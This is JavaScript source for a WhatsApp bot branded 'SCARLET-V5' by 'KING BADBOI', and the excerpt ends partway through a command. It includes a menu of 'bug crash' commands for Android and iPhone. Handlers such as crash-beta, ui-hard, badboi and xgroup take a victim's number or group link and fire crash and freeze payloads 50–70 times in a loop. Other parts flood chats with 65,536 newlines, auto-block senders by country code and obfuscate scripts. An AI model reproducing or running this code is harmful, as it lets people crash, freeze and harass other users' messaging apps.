                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                      m.key.remoteJid
                                                                                                                                  );                                                                            
                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }                
                
                          if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`‰`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                          'text': newly
                                                                                                                                                                                                                                        });
                                                                                                                                                                                                                                        await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                        });
                                                                                                                                                await bad.chatModify(
                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                      m.key.remoteJid
                                                                                                                                  );                                                                            
                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                
                          if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`ထူ်ာ`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                          'text': newly
                                                                                                                                                                                                                                        });
                                                                                                                                                                                                                                        await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                        });
                                                                                                                                                await bad.chatModify(
                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                      m.key.remoteJid
                                                                                                                                  );                                                                            
                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                
                          if (m.message && !m.isGroup && m.sender !== (bad.user.id)) {                                                     if (budy.match(`﷼`)) {                                                                                                                              console.log(color('[VIRUS]', 'red'), color(`Received a virus text from ${m.sender.toString()}`, 'yellow'));                      newly = "\n".repeat(65536);
                                                                                                                                                                                                                                        await bad.sendMessage(m.chat, {
                                                                                                                                                                                                                                          'text': newly
                                                                                                                                                                                                                                        });
                                                                                                                                                                                                                                        await bad.sendMessage(bad.user.id, {
                                                                                                                                                                                                                                          'text': m.sender.split('@')[0x0] + " 𝗧𝗵𝗶𝘀 𝘂𝘀𝗲𝗿 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝘁𝗲𝗰𝘁𝗲𝗱 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗯𝘂𝗴𝘀 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽𝘀 𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝘀𝘀𝗮𝗴𝗲𝘀, 𝘀𝗼 𝗵𝗲 𝗼𝗿 𝘀𝗵𝗲 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱☠️☠️☠️☠️☠️☠️𝗔𝗡𝗧𝗜𝗕𝗨𝗚 𝗕𝗟𝗢𝗖𝗞 𝗜𝗡𝗖𝗢𝗠𝗜𝗡𝗚 𝗕𝗨𝗚 𝗜𝗡 𝗚𝗥𝗢𝗨𝗣𝗦 𝗢𝗥 𝗣𝗠 █▓▒▒░░░𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗕𝗔𝗗𝗕𝗢𝗜░░░▒▒▓█"
                                                                                                                                                                                                                                        });
                                                                                                                                                await bad.chatModify(
                                                                                                                                      { delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] },
                                                                                                                                      m.key.remoteJid
                                                                                                                                  );                                                                            
                                                                                                                                                                                                             await bad.updateBlockStatus(sender, "block");
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
 if (autoread) {
                bad.readMessages([m.key]);
            }

            if (global.autoTyping) {
                bad.sendPresenceUpdate("composing", from);
            }

            if (global.autoRecording) {
                bad.sendPresenceUpdate("recording", from);
            }

            //bot number online status, available=online, unavailable=offline
            bad.sendPresenceUpdate("uavailable", from);

            if (global.autorecordtype) {
                let xeonrecordin = ["recording",
                    "composing"];
                let xeonrecordinfinal =
                xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)];
                bad.sendPresenceUpdate(xeonrecordinfinal, from);
            }

            if (autobio) {
                bad.updateProfileStatus(
                    `24/7 Online Bot By ${botName}`
                ).catch(_ => _);
            }
            if (m.sender.startsWith("92") && global.anti92 === true) {
                return bad.updateBlockStatus(m.sender, "block");
            }


                                            
switch (command) {
case 'button': {

await loading()
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./Gallery/image1.jpg")}, { upload: bad.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5-𝐕𝐈𝐏\n\n> © 2024 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5-𝐕𝐈𝐏 ", "sections": [{ "title": " 𝐁𝐘 𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈 ", "highlight_label": \"𝐊𝐈𝐍𝐆 𝐁𝐀𝐃𝐁𝐎𝐈Ѻ\", "rows": [{ "header": "𝐈𝐧𝐟𝐨", "title": "‌", "id": ".runtime" },
{ "header": "※", "title": "🅾🆆🅽🅴🆁🅼🅴🅽🆄 ", "id": ".ownermenu" },
{ "header": "᯾", "title": "🆅🅸🆁🆄🆂🅼🅴🅽🆄 ", "id": ".bugmenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x\",\"merchant_url\":\"https://whatsapp.com/channel/0029VadCyFZGufJ2YW4bG42x\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: extd })
await bad.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

case 'ownermenu':{

await loading()


let teks = `
┏❐  ⌜ \`𝐊𝐈𝐍𝐆 𝐏𝐔𝐒𝐒𝐘𝑫𝑬𝑽\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐕5
┃ 𝐌𝐨𝐝𝐞 : ${bad.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃ 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
┃   𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
┗❐
⌜ \`𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐\` ⌟  ❐
┃ _self_
┃ _public_
┃ _runtime_
┃ _speed_
┃ _ping_
┗❐
┃ _modeoff_
┃ _animeku_
┃ _owner_
┗❐

 _modeon_
┃ _idchannel_
┃ _buyprem_
┗❐
┃ _badboiban1_
┃ _badboiban2_
┃ _badboiban3_
┗❐
┃ _badboiban4_
┃ _badboiban5_
┃ _badboiban6_
┗❐
┃ _ai_
┃ _decrypt_
┃ _encrypt_
┃ _encrypthard_
┃ _opay_
┗❐
┃ _getcase_
┃ _addcase_
┃ _delcase_
┃ _cekcase_
┗❐
┃ _getfunction_
┃ _delfunction_
┃ _cekfunction_
┃ _addfunction_
┗❐
┃ _getlet_
┃ _dellet_
┃ _addlet_
┃ _addconst_
┗❐
┃ _updatesc_
┗❐

\`© 👑𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄 \``

bad.sendMessage(from, { image: { url: `https://files.catbox.moe/qxbobz.jpeg` }, caption: teks, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
await sleep(2000)

await bad.sendMessage(m.chat, {

audio: darkphonk,

mimetype: 'audio/mpeg'

}, { quoted: extd

})

}
break
case 'menu':{

await loading()

let teks = `
┏❐  ⌜ \`𝐊𝐈𝐍𝐆 𝐏𝐔𝐒𝐒𝐘𝑫𝑬𝑽\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐕5
┃ 𝐌𝐨𝐝𝐞 : ${bad.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃ 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
┃   𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
┗❐
⌜ \`𝙈𝙀𝙉𝙐\` ⌟  ❐
┃ _ownermenu_
┃ _bugmenu_
┃ _groupmenu_ 
┃ _speed_
┃ _runtime_
┃ _button_
┗❐

\`© 👑𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄🇳🇬 \``
bad.sendMessage(from, { image: { url: `https://files.catbox.moe/qxbobz.jpeg` }, caption: teks, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
await sleep(2000)

await bad.sendMessage(m.chat, {

audio: darkphonk,

mimetype: 'audio/mpeg'

}, { quoted: extd

})

}
break
case 'groupmenu':{

await loading()

let teks = `
┏❐  ⌜ \`𝐊𝐈𝐍𝐆 𝐏𝐔𝐒𝐒𝐘𝑫𝑬𝑽\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐕5
┃ 𝐌𝐨𝐝𝐞 : ${bad.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃ 𝐎𝐰𝐧𝐞𝐫 *Name* : ${global.creatorName}
┃   𝐎𝐰𝐧𝐞𝐫 : ${global.owner}
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
┗❐
⌜ \`𝙈𝙀𝙉𝙐\` ⌟  ❐
┃ _opengroup_
┃ _closegroup_ 
┃ _listonline_
┃ _gclink_
┃ _gitclone_ 
┃ _inviteuser_
┃ _demote_
┃ _promote_
┃ _setname_
┗❐

\`© 👑𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄🇳🇬 \``
bad.sendMessage(from, { image: { url: `https://files.catbox.moe/qxbobz.jpeg` }, caption: teks, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
await sleep(2000)

await bad.sendMessage(m.chat, {

audio: darkphonk,

mimetype: 'audio/mpeg'

}, { quoted: extd

})

}
break
case 'bugmenu':{

await loading()

let teks = `
┏❐  ⌜ \`𝐊𝐈𝐍𝐆 𝐏𝐔𝐒𝐒𝐘𝑫𝑬𝑽\` ⌟  ❐
┃ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐒𝐜𝐫𝐢𝐩𝐭 : 𝐕5
┃ 𝐌𝐨𝐝𝐞 : ${bad.public ? '𝑷𝒖𝒃𝒍𝒊𝒄 ' : '𝑺𝒆𝒍𝒇ϟ'}
┃ 𝐎𝐰𝐧𝐞𝐫 : ${global.creatorName}
┃ 𝐎𝐰𝐧𝐞𝐫 *number* : ${global.owner}
┃ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 𝐁𝐨𝐭 : ${runtime(process.uptime())}
┗❐
    〈 Ɓ𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 〉  
│ .hardbug \`<number>\` 
│ .mediumbug \`<number\` 
│ .Scarletfreeze \`<number>\` 
│ .Scarletcrash \`<number>\` 
│ .killsystemui \`<number>\`
│ .blankwhatsapp \`<number>\`
│ .combobug \`<number>\`
│ .locationbug \`<number>\`
│ .documentbug \`<number>\`
│ .byypas \`<number>\`
╰──────────────━

⧎  〈 *BUG IPHONE* 〉  ⧎
│ .lockios \`<IPHONE>\`
│ .iphonecrasherr \`<IPHONE>\`
│ .killacces \`<number>\`
╰──────────────━

⧎  〈 *EMOJI VIRUS* 〉  ⧎
│ .😈 <number>
│ .🦅 <number>
│ .🔥 <number>
╰──────────────━
⧎  〈 *TOOLBUGS* 〉  ⧎
│ .clearbugs \`number\`
│ .pairing \`number\`
╰──────────────━
┏❐ ⌜ \`*BETA BUGS FOR ANDRIOD*\` ⌟  ❐
┃ _attack-andro_
┃ _xbug_    
┃ _x-andro_     
┃ _xcrash_  
┏❐ ⌜ \`*API BUG FOR IOS*\` ⌟  ❐
┃ _ios-kill_  
┃ _ios-dead_     
┃ _war-ios_  
┏❐ ⌜ \`*NEW BUGS*\` ⌟  ❐
┃ _😂_  
┃ _invasi-core_     
┃ _hard-core_  
┃ _garri_ 
┃ _easy-crash_
┏❐ ⌜ \`*NEW BUGS*\` ⌟  ❐
┃ _star_  
┃ _jojo_     
┃ _antis_  
┃ _meta_ 
┃ _kill_
┏❐ ⌜ \`𝑴𝑬𝑵𝑼 𝑩𝑼𝑮 𝑨𝑵𝑫𝑹𝑶𝑰𝑫\` ⌟  ❐
┃ _combo_  
┃ _beta_     
┃ _scarlet_  
┃ _badboi_ 
┃ _witch_
   ⌜ \`𝑴𝑬𝑵𝑼 𝑩𝑼𝑮 𝑰𝑶𝑺\` ⌟  ❐
┃ _xiphone_
┃ _iphone_
┃ _abyys_
┃ _iosbug_
┃ _iosdelay_
   ⌜ \`𝑩𝑼𝑮 𝑪𝑹𝑨𝑺𝑯\` ⌟  ❐
┃ _crash-beta_
┃ _ui-hard_
┃ _darkness_
┃ _lol_ https://chat.whatsapp.com/
┃ _xgroup_ https://chat.whatsapp.com/
┃ _one-tap_ (directbugs only for dm)
┃ _fire_ (directbugs only for dm)
┃ _tap_ (directbugs only for dm)
┗❐

\`© 🇳🇬𝙆𝙄𝙉𝙂 𝘽𝘼𝘿𝘽𝙊𝙄\``
bad.sendMessage(from, { image: { url: `https://files.catbox.moe/qxbobz.jpeg` }, caption: teks, fileLength: 10, contextInfo: { mentionedJid:[sender], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
await sleep(2000)

await bad.sendMessage(m.chat, {

audio: darkphonk,

mimetype: 'audio/mpeg'

}, { quoted: extd

})

}        
break
case 'trxoff': case 'modeoff': {
await loading()


if (!isOwner) return reply("Special Features for Certain Users!!")
bad.public = true
reply('Successfully changedMode *Owner self Off*')
}
break
case 'trxon': case 'modeon': {
await loading()


if (!isOwner) return reply("Special Features for Certain Users!!")
bad.public = false
reply('Successfully changedMode *Owner self ON*')
}
break
case 'self': {


if (!isOwner) return reply("Special Features for Certain Users!!")
bad.public = false
reply("Successfully changed bot mode to *Self*")
}
break
case 'public': {


if (!isOwner) return reply("Special Features for Certain Users!!")
bad.public = true
reply("Successfully changed bot mode to *public*")
}
break
case 'get': {
await loading()


if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return reply("linknya")
try {
var check = await fetchJson(text)
reply(JSON.stringify(check, null, 2))
} catch (e) {
return reply(e.toString())
}}
break
case 'owner': {

bad.sendContact(m.chat, [owner], "Developer Bot WhatsApp", null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./Gallery/scar1.jpg"), 
title: `© Copyright ${global.botName}`, 
renderLargerThumbnail: true, 
sourceUrl: global.link, 
mediaType: 1
}}})
}
break
case 'encrypt': {

await loading()
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await m.reply("processing  encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await bad.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'encrypthard': {

await loading()
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("processing  encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "阿庫拉Badboi種類/*($break)*/" + 
            "阿庫拉Badboi種類/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await bad.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
//// BUG MADE
break
case 'crash-beta': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null)
await Combox(from, jumlah)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox2(from, jumlah)
await Combox(from, jumlah)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox2(from, jumlah)
} 
reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
await sleep(2000)
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

case 'ui-hard': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await newvirpen(target, true)
await freezeui(target, true)
await freezeuii(target, true)
}
reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
await sleep(2000)
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'xgroup': case 'lol': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Use .${command} https://chat.whatsapp.com/`)
reply(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await bad.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await caltx(target, true)
await sleep(10)
await freezegc(target, true)
}
reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
   `)
await sleep(2000)
await bad.sendMessage(m.chat, {
audio: darkphonk,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
case 'badboi': {

               
if (!isOwner) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await newfreezebug(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await freezekamoflase(target, true)
await newfreezebug(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
reply(`
